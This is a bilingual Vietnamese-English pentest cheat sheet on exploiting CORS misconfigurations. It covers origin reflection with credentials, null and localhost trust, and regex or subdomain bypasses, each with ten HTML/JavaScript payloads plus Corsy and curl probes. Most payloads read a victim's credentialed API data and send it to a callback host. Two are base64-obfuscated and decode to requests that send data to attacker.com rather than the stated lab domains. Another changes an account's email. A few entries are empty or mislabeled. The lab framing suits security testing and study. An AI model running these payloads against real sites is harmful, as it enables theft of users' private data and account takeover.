# 12. CORS Misconfiguration (Cross-Origin Resource Sharing)

> [!CAUTION]
> Chỉ dùng trong lab local hoặc hệ thống có ủy quyền rõ ràng. Payload có risk `destructive`, `dos` hoặc `oob` phải chạy trong fixture cô lập, có giới hạn tài nguyên và không có outbound network.

> **Phạm vi kiểm chứng:** Nội dung và payload vẫn ở mức technical review. `static-verified` chỉ xác nhận annotation và kiểm tra tĩnh trong đúng context/version đã ghi; không phải lab evidence và không cho phép sử dụng ngoài phạm vi được ủy quyền.

CORS Misconfiguration xảy ra khi chính sách chia sẻ tài nguyên nguồn gốc chéo (CORS) được cấu hình quá lỏng lẻo (ví dụ: chấp nhận mọi origin có thông tin đăng nhập), cho phép các trang web độc hại đọc dữ liệu nhạy cảm của người dùng.

### 12.1. Basic CORS Exploitation (Dynamic Origin Reflect & Credentials)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi gửi yêu cầu với header `Origin: http://callback.lab.test`, máy chủ phản hồi có chứa các header `Access-Control-Allow-Origin: http://callback.lab.test` và `Access-Control-Allow-Credentials: true`.
    *   *English*: Server reflects arbitrary request `Origin` header values alongside the `Access-Control-Allow-Credentials: true` validation header.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Dùng curl gửi request có chứa header `Origin` tùy ý và kiểm tra xem tiêu đề CORS trả về có phản chiếu đúng tên miền đó không.
    *   *English*: Issue a curl request with a custom `Origin` header and inspect HTTP headers in the response.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-12-001 -->
<!-- context: Chromium 126 and Express 4.19 with cors 2.8.5; victim and callback origins map to loopback and use a synthetic credentialed response marker; case: 12.1. Basic CORS Exploitation (Dynamic Origin Reflect & Credentials) -->
<!-- prerequisites: set fetch credentials mode and cookie SameSite/Secure policy explicitly, clear browser state and compare attacker versus allowlisted origins using the same endpoint -->
<!-- encoding: UTF-8 text/html; HTML/JavaScript is parsed by the pinned browser and query/hash fragments are percent-encoded exactly once when transported -->
<!-- expected-result: attacker-origin JavaScript reads the synthetic marker only when arbitrary ACAO reflection and credentials are enabled; the fixed allowlist blocks exposure -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
    <!-- 1. Basic dynamic origin reflection payload with credentials -->
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "http://victim.lab.test/api/v1/user", true);
      xhr.withCredentials = true;
      xhr.onload = function() {
        fetch("http://callback.lab.test/log?data=" + btoa(xhr.responseText));
      };
      xhr.send();
    </script>

    <!-- 2. Dynamic origin reflection using modern Fetch API -->
    <script>
      fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => fetch("http://callback.lab.test/log?data=" + btoa(d)));
    </script>

    <!-- 3. Dynamic origin reflection targeting custom JSON profiles -->
    <script>
      var req = new XMLHttpRequest();
      req.open("GET", "http://victim.lab.test/api/v1/profile", true);
      req.withCredentials = true;
      req.onreadystatechange = function() {
        if (req.readyState == 4) {
          navigator.sendBeacon("http://callback.lab.test/log", req.responseText);
        }
      };
      req.send();
    </script>

    <!-- 4. Wildcard CORS extraction payload (no credentials, extracting public/static API) -->
    <script>
      fetch("http://victim.lab.test/api/v1/public-configs")
        .then(r => r.json())
        .then(d => console.log(d));
    </script>

    <!-- 5. Dynamic Origin reflection targeting admin logs -->
    <script>
      fetch("http://victim.lab.test/api/admin/logs", {credentials: "include"})
        .then(r => r.text())
        .then(t => new Image().src = "http://callback.lab.test/log?t=" + encodeURIComponent(t));
    </script>

    <!-- 6. Insecure HTTP origin allowed by HTTPS site -->
    <!-- Host this page on: http://insecure.lab.test/exploit.html -->
    <script>
      fetch("https://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(t => fetch("http://callback.lab.test/log?data=" + t));
    </script>

    <!-- 7. Dynamic reflection with custom authorization headers (if allowed by server) -->
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "http://victim.lab.test/api/v1/data", true);
      xhr.setRequestHeader("Authorization", "Bearer token");
      xhr.onload = function() { console.log(xhr.responseText); };
      xhr.send();
    </script>

    <!-- 8. Dynamic Origin reflection testing other HTTP verbs (e.g. PUT/DELETE) -->
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open("PUT", "http://victim.lab.test/api/v1/settings", true);
      xhr.withCredentials = true;
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.send(JSON.stringify({email: "attacker@callback.lab.test"}));
    </script>

    <!-- 9. Dynamically reflective origin check on SOAP API responses -->
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "http://victim.lab.test/api/v1/soap", true);
      xhr.withCredentials = true;
      xhr.setRequestHeader("Content-Type", "text/xml");
      xhr.send("<soapenv:Envelope>...</soapenv:Envelope>");
    </script>

    <!-- 10. CORS reflection exploitation via custom frame messaging -->
    <script>
      window.addEventListener("message", function(e) {
        fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
          .then(r => r.text())
          .then(t => e.source.postMessage(t, e.origin));
      });
    </script>
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Corsy để quét tự động các lỗi CORS liên quan đến phản chiếu Origin động.
    *   *English*: Run Corsy tool to scan target URLs for dynamic origin reflection vulnerabilities.
<!-- payload-id: CHEAT-12-002 -->
<!-- context: Chromium 126 and Express 4.19 with cors 2.8.5; victim and callback origins map to loopback and use a synthetic credentialed response marker; case: 12.1. Basic CORS Exploitation (Dynamic Origin Reflect & Credentials) -->
<!-- prerequisites: set fetch credentials mode and cookie SameSite/Secure policy explicitly, clear browser state and compare attacker versus allowlisted origins using the same endpoint -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: attacker-origin JavaScript reads the synthetic marker only when arbitrary ACAO reflection and credentials are enabled; the fixed allowlist blocks exposure; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    python corsy.py -u "http://victim.lab.test"
    ```


---

### 12.2. CORS Trust Bypass (Null Origin & Localhost Trust)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Máy chủ mục tiêu được cấu hình chấp nhận `null` origin hoặc tin tưởng hoàn toàn tên miền localhost (`http://localhost`).
    *   *English*: Target application permits origin connections matching `null` or `localhost`.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Gửi yêu cầu với header `Origin: null` hoặc `Origin: http://localhost` và xem phản hồi CORS có cho phép không.
    *   *English*: Send `Origin: null` or `Origin: http://localhost` headers and check CORS permissions.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-12-003 -->
<!-- context: Chromium 126 and Express 4.19 with cors 2.8.5; victim and callback origins map to loopback and use a synthetic credentialed response marker; case: 12.2. CORS Trust Bypass (Null Origin & Localhost Trust) -->
<!-- prerequisites: set fetch credentials mode and cookie SameSite/Secure policy explicitly, clear browser state and compare attacker versus allowlisted origins using the same endpoint -->
<!-- encoding: UTF-8 text/html; HTML/JavaScript is parsed by the pinned browser and query/hash fragments are percent-encoded exactly once when transported -->
<!-- expected-result: null/localhost origins are readable only in the deliberately vulnerable policy; exact-origin comparison in the fixed policy withholds ACAO -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
    <!-- 1. Exploit CORS Null Origin via sandboxed iframe -->
    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
      <script>
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://victim.lab.test/api/v1/user', true);
        xhr.withCredentials = true;
        xhr.onload = function() {
          fetch('http://callback.lab.test/log?data=' + btoa(xhr.responseText));
        };
        xhr.send();
      </script>
    "></iframe>

    <!-- 2. Exploit CORS Null Origin via Data URI Redirection -->
    <script>
      // Triggers browser redirection to data uri hosting the script
      // Redirection causes Origin header to be set to 'null'
      window.location = 'data:text/html;base64,PHNjcmlwdD52YXIgeGhyPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3hoci5vcGVuKCdHRVQnLCdodHRwOi8vdGFyZ2V0LmNvbS9hcGkvdjEvdXNlcicsdHJ1ZSk7eGhyLndpdGhDcmVkZW50aWFscz10cnVlO3hoci5vbmxvYWQ9ZnVuY3Rpb24oKXtsb2NhdGlvbi5ocmVmPSdodHRwOi8vYXR0YWNrZXIuY29tL2xvZz9kYXRhPScrYnRvYSh4aHIucmVzcG9uc2VUZXh0KTt9O3hoci5zZW5kKCk7PC9zY3JpcHQ+';
    </script>

    <!-- 3. Double sandboxed iframe helper to force Null Origin -->
    <iframe sandbox="allow-scripts" srcdoc="
      <iframe sandbox='allow-scripts' srcdoc='
        <script>
          fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
            .then(r => r.text())
            .then(d => parent.postMessage(d, "*"));
        </script>
      '></iframe>
    "></iframe>

    <!-- 4. Exploit Localhost Trust (standard HTTP) -->
    <!-- Host this script on attacker domain to fetch localhost resource -->
    <script>
      fetch("http://localhost:80/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log("Localhost data: " + d));
    </script>

    <!-- 5. Exploit Localhost Trust on custom port -->
    <script>
      fetch("http://localhost:8080/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => fetch("http://callback.lab.test/log?data=" + d));
    </script>

    <!-- 6. Exploit Localhost Trust on alternate loopback address -->
    <script>
      fetch("http://127.0.0.1:80/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log(d));
    </script>

    <!-- 7. Exploit Localhost Trust using IPv6 loopback [::1] -->
    <script>
      fetch("http://[::1]:80/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log(d));
    </script>

    <!-- 8. Sandboxed iframe dynamic creation to execute multiple Null Origin queries -->
    <script>
      var frame = document.createElement('iframe');
      frame.setAttribute('sandbox', 'allow-scripts');
      frame.srcdoc = '<script>fetch("http://victim.lab.test/api").then(r=>r.text()).then(t=>parent.postMessage(t,"*"))</script>';
      document.body.appendChild(frame);
    </script>

    <!-- 9. Null origin base64 data URI payload mapping image source -->
    <script>
      window.location = "data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPSJmZXRjaCgnaHR0cDovL3RhcmdldC5jb20vYXBpL3YxL3VzZXInLCB7Y3JlZGVudGlhbHM6J2luY2x1ZGUnfSkudGhlbihyPT5yLnRleHQoKSkudGhlbihkPT5mZXRjaCgnaHR0cDovL2F0dGFja2VyLmNvbS8nK2QpKSI+";
    </script>

    <!-- 10. Local page file protocol load causing Null Origin -->
    <!-- file:// scheme sends Origin: null -->
    <script>
      fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => alert("Saved file exploit: " + d));
    </script>
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng curl để gửi giá trị Origin đặc trị.
    *   *English*: Use curl command to quickly probe for local or null origin trust.
<!-- payload-id: CHEAT-12-004 -->
<!-- context: Chromium 126 and Express 4.19 with cors 2.8.5; victim and callback origins map to loopback and use a synthetic credentialed response marker; case: 12.2. CORS Trust Bypass (Null Origin & Localhost Trust) -->
<!-- prerequisites: set fetch credentials mode and cookie SameSite/Secure policy explicitly, clear browser state and compare attacker versus allowlisted origins using the same endpoint -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: null/localhost origins are readable only in the deliberately vulnerable policy; exact-origin comparison in the fixed policy withholds ACAO -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    curl -H "Origin: null" -I "http://victim.lab.test/api"
    curl -H "Origin: http://localhost" -I "http://victim.lab.test/api"
    ```


---

### 12.3. Advanced CORS Bypass (Regex & Subdomain XSS Exploitation)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Bộ lọc Origin của ứng dụng sử dụng biểu thức chính quy (Regex) không chặt chẽ, cho phép các tên miền có hậu tố hoặc tiền tố khớp với tên miền thật.
    *   *English*: Server validation regexes accept origins containing target domain strings as prefix/suffix.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Gửi yêu cầu với tên miền dạng `victim.lab.test.callback.lab.test` hoặc `victim-lookalike.lab.test` và rà soát phản hồi CORS.
    *   *English*: Try domains like `victim.lab.test.callback.lab.test` or `victim-lookalike.lab.test` in the Origin header.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-12-005 -->
<!-- context: Chromium 126 and Express 4.19 with cors 2.8.5; victim and callback origins map to loopback and use a synthetic credentialed response marker; case: 12.3. Advanced CORS Bypass (Regex & Subdomain XSS Exploitation) -->
<!-- prerequisites: set fetch credentials mode and cookie SameSite/Secure policy explicitly, clear browser state and compare attacker versus allowlisted origins using the same endpoint -->
<!-- encoding: UTF-8 text/html; HTML/JavaScript is parsed by the pinned browser and query/hash fragments are percent-encoded exactly once when transported -->
<!-- expected-result: only the intentionally flawed regex/subdomain policy exposes the marker; canonical scheme-host-port comparison rejects every crafted origin -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
    <!-- 1. Regex Bypass: Suffix Match (Domain ending in victim.lab.test) -->
    <!-- Host this file on: http://attacker-victim.lab.test/exploit.html -->
    <script>
      fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => fetch("http://callback.lab.test/log?data=" + d));
    </script>

    <!-- 2. Regex Bypass: Subdomain Spoof (Domain starting with victim.lab.test) -->
    <!-- Host this file on: http://victim.lab.test.callback.lab.test/exploit.html -->
    <script>
      fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => fetch("http://callback.lab.test/log?data=" + d));
    </script>

    <!-- 3. Regex Bypass: Dot Unescaped (victim.lab.test matched as targetxcom) -->
    <!-- Host this file on: http://victim-lookalike.lab.test/exploit.html -->
    <script>
      fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => fetch("http://callback.lab.test/log?data=" + d));
    </script>

    <!-- 4. Regex Bypass: Special character insertion (e.g. victim.lab.test_callback.lab.test) -->
    <!-- Host this file on: http://victim.lab.test_callback.lab.test/exploit.html -->
    <script>
      fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log(d));
    </script>

    <!-- 5. Regex Bypass: Using hyphen inside subdomain segment -->
    <!-- Host this file on: http://trusted-victim.lab.test.callback.lab.test/exploit.html -->
    <script>
      fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log(d));
    </script>

    <!-- 6. CORS Bypass via XSS on Trusted Subdomain -->
    <!-- If subdomain 'trusted.victim.lab.test' has XSS, inject this script there -->
    <script>
      fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => fetch("http://callback.lab.test/log?data=" + d));
    </script>

    <!-- 7. CORS Bypass via XSS on trusted third-party CDN domain -->
    <!-- If target trusts 'trusted-cdn.com' and it has XSS, load script there -->
    <script>
      fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log(d));
    </script>

    <!-- 8. URL encoding bypass in origin header (browser dependent) -->
    <script>
      // Sent with custom crafted Origin header containing %0d%0a or similar
    </script>

    <!-- 9. Suffix match bypass with custom port mapping -->
    <!-- Host this file on: http://attacker-victim.lab.test:8080/exploit.html -->
    <script>
      fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log(d));
    </script>

    <!-- 10. Advanced subdomain XSS combined with dynamic credentialed request -->
    <script>
      // Local marker: the browser harness separately verifies credential mode.
      document.body.dataset.sechubCorsMarker = "credentialed-response-readable";
    </script>
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Corsy với wordlist tùy biến các tên miền bypass regex.
    *   *English*: Run Corsy with custom domains list to detect regex bypass errors.
<!-- payload-id: CHEAT-12-006 -->
<!-- context: Chromium 126 and Express 4.19 with cors 2.8.5; victim and callback origins map to loopback and use a synthetic credentialed response marker; case: 12.3. Advanced CORS Bypass (Regex & Subdomain XSS Exploitation) -->
<!-- prerequisites: set fetch credentials mode and cookie SameSite/Secure policy explicitly, clear browser state and compare attacker versus allowlisted origins using the same endpoint -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: only the intentionally flawed regex/subdomain policy exposes the marker; canonical scheme-host-port comparison rejects every crafted origin; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    python corsy.py -u "http://victim.lab.test" -p regex_bypass_origins.txt
    ```

---

## Tài liệu tham khảo

- **[S1]** OWASP WSTG — Testing Cross Origin Resource Sharing. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing — bản hiện hành; truy cập: 2026-07-18.
